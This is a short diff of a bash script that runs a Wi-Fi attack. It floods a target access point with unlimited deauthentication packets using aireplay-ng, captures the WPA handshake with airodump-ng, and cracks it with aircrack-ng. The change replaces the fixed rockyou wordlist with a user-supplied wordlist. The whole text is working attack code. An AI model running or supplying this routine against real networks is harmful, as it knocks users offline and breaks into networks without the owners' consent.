@@ -23,5 +23,7 @@ output_file="${output_dir}/${bssid}_${timestamp}"
 xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
 pcap_file="${output_file}-01.cap"
 wait
-aircrack-ng -w "wordlists/rockyou.txt" "$pcap_file"
+read -p "Enter the path to your custom wordlist file: " custom_wordlist
+custom_wordlist=$(sanitize_input "$custom_wordlist")
+aircrack-ng -w "$custom_wordlist" "$pcap_file"
 exit 0
